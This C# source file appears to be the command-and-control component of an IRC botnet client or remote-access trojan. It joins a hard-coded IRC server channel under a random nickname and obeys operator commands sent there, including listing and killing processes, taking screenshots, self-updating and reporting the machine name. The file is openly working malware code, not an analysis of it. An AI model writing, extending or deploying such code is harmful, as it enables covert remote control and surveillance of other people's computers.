using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using ChatSharp;

namespace tom
{
    class IRC
    {
        public string VERSION = "v1";

        private IrcChannel channel;
        private BotActions actions;

        private string server = "irc.breakfastcraft.com";
        private string chan = "#bots";
        private string name = "";

        public IRC()
        {
            actions = new BotActions(this);

            Random r = new Random();            
            name = "tom_"+VERSION+"_" + r.Next(10000);            
            Connect(name);
        }

        public void NewMessage(string message)
        {
            String[] msg = message.Split(' ');

            // there are at least 2 commands
            if (msg.Length > 1)
            {
                // first command is bot name or "all"
                if (msg[0].Equals("all"))
                {
                    // if all includes this bots version
                    if (msg[1].Equals(VERSION) || msg[1].Equals("v*"))
                    {
                        if (msg.Length > 3)
                        {
                            String[] cmd = { msg[2], msg[3] };
                            DoAction(cmd);
                        }
                        else if (msg.Length > 2)
                        {
                            String[] cmd = {msg[2]};
                            DoAction(cmd);
                        }                        
                    }
                }
                if (msg[0].Equals(name))
                {
                    if (msg.Length > 2)
                    {
                        String[] cmd = { msg[1], msg[2] };
                        DoAction(cmd);
                    }
                    else if (msg.Length > 1)
                    {
                        String[] cmd = { msg[1] };
                        DoAction(cmd);
                    }
                }
            }
        }

        public void DoAction(string[] command)
        {
            switch (command[0])
            {
                case "hi":
                    SendMessage("hello");
                    break;
                case "update":
                    SendMessage(actions.Update());
                    break;
                case "help":
                    actions.HelpMenu();
                    break;
                case "processes":
                    actions.ListProcesses();
                    break;
                case "name":
                    actions.Name();
                    break;
                case "screen":
                    actions.ScreenShot();
                    break;
                case "kill":
                    if (command.Length > 1)
                        actions.KillProcess(command[1]);
                    break;
            }
        }

        public void SendMessage(string message)
        {
            Thread.Sleep(100);
            channel.SendMessage(message);
        }

        public void Connect(string name)
        {
            var client = new IrcClient(server, new IrcUser(name, name));

            client.ConnectionComplete += (s, e) => client.JoinChannel(chan);

            client.ChannelMessageRecieved += (s, e) =>
            {
                channel = client.Channels[e.PrivateMessage.Source];

                NewMessage(e.PrivateMessage.Message.ToString());

                if (e.PrivateMessage.Message == ".list")
                    channel.SendMessage(string.Join(", ", channel.Users.Select(u => u.Nick)));
            };

            client.ConnectAsync();
        }
    }

    
}
